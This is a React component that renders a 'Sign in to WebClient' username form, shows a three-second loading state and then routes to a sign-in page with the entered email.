import React from 'react';
import axios from 'axios';
import './hometwo.css';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

import mainbg from './mainbg.jpeg';
import logotwo from './logotwo.gif';




function HomeTwo(){

    const[email, setUserName] = useState("");
    const[isLoading, setIsLoading]= useState(false);
    const navigate = useNavigate();

    function handleNext(e){
        e.preventDefault();
        setIsLoading(true);

        setTimeout(() => {
            setIsLoading(false);
            navigate('/sign-in',{state:{email:email}});
          }, 3000);

       
    }


    return (
        <>

            <div className='mainContent'>

                <div className='col-md-3 m-auto maindiv py-3'>

                    <div className='imagediv text-center'>
                        <img src={logotwo} className="mylogo" />

                    </div>

                    <h2 className='mainhead'>Sign in to WebClient</h2>

                  

                    <form onSubmit={handleNext}>
                    <div className='borderdiv py-1'>
                        <input onChange={function(e){
                        setUserName(e.target.value);
                    }} value={email}  type="text"className='form-control w-100 py-4'placeholder='Username' required/>
                        
                        </div>
                        
                        <div className='px-3'>
                        <button className='next btn w-100'>
                            {isLoading ? "Loading ....." : "Next"}
                        </button>

                        </div>
                    </form>

                

                </div>


                

            </div>
        
        
        </>
    );

}

export default HomeTwo;